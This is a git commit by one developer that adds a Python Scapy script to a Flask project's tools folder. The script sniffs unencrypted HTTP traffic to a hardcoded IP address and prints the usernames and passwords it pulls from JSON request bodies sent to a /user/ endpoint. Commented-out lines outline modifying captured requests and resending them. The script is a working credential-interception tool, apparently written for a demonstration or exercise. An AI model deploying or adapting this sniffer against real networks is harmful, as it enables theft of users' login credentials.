15830e60de4e61b81a027d282d5de52ecc2f4edc
yaniv.choen.1 <yaniv.choen.1@gmail.com>
2024-12-03 18:28:13 +0200

    ud

---
+++ flaskr/tools/scapy/scapy_http_sniff.py
@@ -0,0 +1,33 @@
+import json
+from scapy.all import *
+from scapy.layers.http import HTTPRequest, HTTPResponse
+from scapy.layers.inet import UDP, TCP, IP, Ether
+
+# Define the IP address and port to filter
+target_ip = "54.187.16.171"
+target_port = 80
+
+def process_out_packet(packet):
+    if packet.haslayer(HTTPRequest) and packet[IP].dst == target_ip:
+        # Modify the HTTP request
+        print(packet)
+        if packet[HTTPRequest].Path == b"/user/" and packet.haslayer(Raw):
+            payload_bin = packet[Raw].load
+            payload_dict = json.loads(payload_bin)
+            if packet[HTTPRequest].Method == b"POST":
+                print(f"user:{payload_dict[0]}")
+                print(f"password:{payload_dict[1]}")
+            if packet[HTTPRequest].Method == b"PUT":
+                print(f'user:{payload_dict["user_name"]}')
+                print(f'password:{payload_dict["password"]}')
+        # Send the modified packet back
+        # packet[HTTPRequest].Method = "GET"
+        # packet[HTTPRequest].Path = "/new-path"
+        # sendp(packet) # , iface="eth0"
+
+    if packet.haslayer(HTTPResponse) and packet[IP].src == target_ip:
+        if packet.haslayer(Raw):
+            print(packet[Raw].load)
+
+# Sniff HTTP packets from the specified IP and port
+sniff(filter=f"tcp and host {target_ip} and port {target_port}", prn=process_out_packet, store=False)
